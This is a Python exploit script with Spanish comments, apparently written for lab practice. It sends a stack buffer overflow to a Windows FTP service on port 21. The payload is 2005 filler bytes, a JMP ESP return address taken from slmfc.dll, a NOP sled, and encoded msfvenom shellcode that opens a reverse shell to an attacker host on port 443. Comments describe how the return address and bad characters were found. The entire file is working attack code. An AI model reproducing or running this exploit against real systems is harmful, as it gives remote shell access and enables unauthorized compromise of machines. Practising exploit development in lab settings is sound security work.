#!/usr/bin/python

import socket, sys
from struct import pack

def explotacion():
    
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.112.168 LPORT=443 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
    
    shellcode=("\xd9\xc5\xd9\x74\x24\xf4\xbf\xf6\xda\x6e\xbb\x58\x2b\xc9\xb1"
                "\x52\x31\x78\x17\x03\x78\x17\x83\x36\xde\x8c\x4e\x4a\x37\xd2"
                "\xb1\xb2\xc8\xb3\x38\x57\xf9\xf3\x5f\x1c\xaa\xc3\x14\x70\x47"
                "\xaf\x79\x60\xdc\xdd\x55\x87\x55\x6b\x80\xa6\x66\xc0\xf0\xa9"
                "\xe4\x1b\x25\x09\xd4\xd3\x38\x48\x11\x09\xb0\x18\xca\x45\x67"
                "\x8c\x7f\x13\xb4\x27\x33\xb5\xbc\xd4\x84\xb4\xed\x4b\x9e\xee"
                "\x2d\x6a\x73\x9b\x67\x74\x90\xa6\x3e\x0f\x62\x5c\xc1\xd9\xba"
                "\x9d\x6e\x24\x73\x6c\x6e\x61\xb4\x8f\x05\x9b\xc6\x32\x1e\x58"
                "\xb4\xe8\xab\x7a\x1e\x7a\x0b\xa6\x9e\xaf\xca\x2d\xac\x04\x98"
                "\x69\xb1\x9b\x4d\x02\xcd\x10\x70\xc4\x47\x62\x57\xc0\x0c\x30"
                "\xf6\x51\xe9\x97\x07\x81\x52\x47\xa2\xca\x7f\x9c\xdf\x91\x17"
                "\x51\xd2\x29\xe8\xfd\x65\x5a\xda\xa2\xdd\xf4\x56\x2a\xf8\x03"
                "\x98\x01\xbc\x9b\x67\xaa\xbd\xb2\xa3\xfe\xed\xac\x02\x7f\x66"
                "\x2c\xaa\xaa\x29\x7c\x04\x05\x8a\x2c\xe4\xf5\x62\x26\xeb\x2a"
                "\x92\x49\x21\x43\x39\xb0\xa2\xac\x16\xca\x9a\x45\x65\x2a\xda"
                "\x2e\xe0\xcc\xb6\x40\xa5\x47\x2f\xf8\xec\x13\xce\x05\x3b\x5e"
                "\xd0\x8e\xc8\x9f\x9f\x66\xa4\xb3\x48\x87\xf3\xe9\xdf\x98\x29"
                "\x85\xbc\x0b\xb6\x55\xca\x37\x61\x02\x9b\x86\x78\xc6\x31\xb0"
                "\xd2\xf4\xcb\x24\x1c\xbc\x17\x95\xa3\x3d\xd5\xa1\x87\x2d\x23"
                "\x29\x8c\x19\xfb\x7c\x5a\xf7\xbd\xd6\x2c\xa1\x17\x84\xe6\x25"
                "\xe1\xe6\x38\x33\xee\x22\xcf\xdb\x5f\x9b\x96\xe4\x50\x4b\x1f"
                "\x9d\x8c\xeb\xe0\x74\x15\x1b\xab\xd4\x3c\xb4\x72\x8d\x7c\xd9"
                "\x84\x78\x42\xe4\x06\x88\x3b\x13\x16\xf9\x3e\x5f\x90\x12\x33"
                "\xf0\x75\x14\xe0\xf1\x5f")
    
    offset=2005
    buffer="A"*offset
    #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
    #jmp ESP
    #copiar oppcode
    #buscar en una dll del programa
    #!mona modules
    #tiene que tener las protecciones todo false
    #!mona find -s "\xff\xe4" -m slmfc.dll
    #ver que la direccion no tenga un badchar y copiar cualquiera
    buffer+=pack("<L",0x76682d4f) #0x75e84e5b
    buffer+="\x90"*20
    buffer+=shellcode
    
    try:
            
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.112.138',21))
        s.send(buffer)
        data = s.recv(1024)
    except:
        print("\n[!] Ha habido un error de conexion\n")
        sys.exit(1)
    

        


if __name__ == "__main__":
    explotacion()